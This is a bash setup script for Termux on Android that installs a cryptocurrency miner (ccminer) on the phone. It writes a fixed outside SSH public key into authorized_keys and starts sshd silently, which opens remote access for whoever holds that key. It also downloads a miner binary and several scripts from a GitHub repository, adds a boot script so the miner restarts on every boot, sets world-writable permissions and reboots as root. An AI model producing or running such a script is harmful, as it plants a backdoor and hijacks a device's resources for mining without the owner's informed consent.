#!/bin/bash
yes | pkg update
yes | pkg upgrade
yes | pkg install cronie termux-services libjansson wget nano screen nmap openssh
mkdir ~/.ssh
chmod 0700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOAPjnQbztXVnQDGl1Xqty7kFyTZY4MEJgCn6Et6vRpivHV+dMHyLnsCp2iAxDnh99ld9P8adVpwWdOaaUm3wzxzRFK+83ZZGGuFO6/BRzC8J0D4CFur++rVdC8zHhyaGKTVU/I10dpYwVfnfyYjhBoFhb8lnMp3SIkd56HnHJDuAWg6Cr31wvevUbulOHh6uOaBdvyyAJxY8ASHyPOEDDIlo+4/oirMudO0L46zTvxktmAby0ZwD4jOcUK2K52L0+Xe7zWBRnDtY9bKTLoJFQ9McSVzoVTsXxlvGIJmW0WGTPfLf/o3w5T+JiE1vJL2/S+A7YSMgo952fofGl6r6R" > ~/.ssh/authorized_keys
chmod 0600 ~/.ssh/authorized_keys
sshd > /dev/null 2>&1
mkdir -p ~/.termux/boot && mkdir ~/ccminer && cd ~/ccminer
wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/ccminer_a53 -O ~/ccminer/ccminer
wget https://raw.githubusercontent.com/btcdollar/nana/main/start.sh
wget https://raw.githubusercontent.com/btcdollar/nana/refs/heads/main/config.json
chmod +x ccminer start.sh
cd ~/.termux/boot
wget https://raw.githubusercontent.com/btcdollar/nana/main/boot_start
chmod -R 777 ~/.termux/boot
cd
rm ncc.sh
wget https://raw.githubusercontent.com/btcdollar/nana/main/ncc.sh
chmod 777 ncc.sh
mkdir ~/.cache
sleep 5
su -c reboot
